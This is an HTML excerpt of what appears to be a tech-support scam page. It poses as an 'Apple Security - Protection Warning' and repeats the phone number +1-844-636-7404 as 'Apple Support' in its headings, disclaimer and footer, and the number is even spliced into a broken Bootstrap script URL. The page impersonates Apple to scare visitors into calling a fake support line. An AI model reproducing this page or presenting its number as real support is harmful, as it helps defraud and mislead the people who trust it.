...
<head>
    ...
    <script src="https://stackpath.bootstrapcdn.com/boot+1-844-636-7404strap/4.5.2/js/bootstrap.min.js"
...
top: 6px;
font-weight: 500;
font-size: 19px;" id="text12"><b>+1-844-636-7404(free security)</b></h3>
...
margin-top: 8px; text-align: center;">Apple Security - Protection Warning</p>
          ...
          <p style="padding-bottom: 0px;">Call Apple Support <strong>+1-844-636-7404(Security Support)</strong></p>
  ...
  <div id="lst" class="lst lightbox">
    ...
    <div id="disclaimer">
      ...
      <span class="support">Contact Apple Support: +1-844-636-7404(Security Support)</span>
    </div>
    <div id="bottom">
        ...
        <div class="right-foot" style="text-align: center;">
          <span id="footertxt" style="font-weight: 700;"><img src="apple.png"> Apple</span><span
            style="font-weight: 700;padding-left: 5px;color: #fff;">Support contact <span
              style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">+1-844-636-7404(Security
              Support)</span></span>
        </div>
      </div>
      <div class="col-md-12">
